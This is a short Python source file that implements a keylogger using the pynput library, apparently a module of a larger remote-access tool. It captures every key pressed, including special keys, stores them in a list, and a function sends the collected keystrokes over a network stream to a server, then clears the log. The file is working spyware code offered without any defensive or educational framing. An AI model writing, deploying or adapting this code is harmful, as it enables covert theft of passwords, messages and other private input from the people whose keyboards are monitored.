from pynput.keyboard import Listener

key_log = []

def log_keystrokes(key):
    """
    Listen to pressed keys and append to a list
    """
    try:
        key_log.append(key.char)
    except AttributeError:
        if key == key.space:
            key_log.append(" ")
        else:
            key_log.append(f" [{key}] ")

def start_keylogger():
    """
    init keylogger in a separate thread
    """
    with Listener(on_press=log_keystrokes) as listener:
        listener.join()

def send_keylogs(data_stream):
    """
    send keys to server
    """
    if key_log:
        logs = "".join(key_log)
        data_stream.send(str.encode(f"Keylogs:\n{logs}\n"))
        key_log.clear()  # Vide le journal après l'envoi
    else:
        data_stream.send(str.encode("not keys pressed.\n"))
